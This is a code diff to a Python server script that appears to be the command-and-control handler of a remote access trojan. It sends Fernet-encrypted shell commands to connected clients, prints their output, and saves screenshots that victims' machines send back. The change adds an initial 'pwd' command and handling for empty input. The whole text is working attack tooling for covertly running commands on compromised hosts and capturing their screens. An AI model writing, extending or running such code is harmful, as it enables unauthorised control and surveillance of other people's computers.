@@ -18,21 +18,33 @@ print(f"AES Key: {key.decode()}")
 
 def handle_client(client_socket, addr):
     try:
+        # First, send an initial command to kick things off.
+        # The client will execute this and send back the output.
+        # We'll just get the current working directory to start.
+        initial_cmd = "pwd" # or "cd" for Windows
+        client_socket.send(fernet.encrypt(initial_cmd.encode()))
+
         while True:
-            # Receive and decrypt data
+            # Receive and decrypt data from the client
             data = client_socket.recv(4096)
             if not data:
                 break
+            
             decrypted = fernet.decrypt(data)
-            if decrypted.startswith(b"iVBORw0KGgo"):  # PNG magic bytes for screenshots
+
+            # Process and display the data
+            if decrypted.startswith(b"iVBORw0KGgo"):  # PNG magic bytes
                 with open(f"screenshot_{addr[0]}.png", "wb") as f:
-                    f.write(decrypted)  # Save raw PNG
+                    f.write(decrypted)
                 print(f"Screenshot saved as screenshot_{addr[0]}.png")
             else:
-                print(f"Output from {addr}: {decrypted.decode()}")
-            
-            # Send command
+                # Print the output from the last command
+                print(decrypted.decode(), end='')
+
+            # Now, get the next command from the user and send it
             cmd = input(f"Shell [{addr[0]}]> ")
+            if not cmd: # Handle empty input
+                cmd = "echo"
             if cmd.lower() == "exit":
                 client_socket.send(fernet.encrypt(b"exit"))
                 break
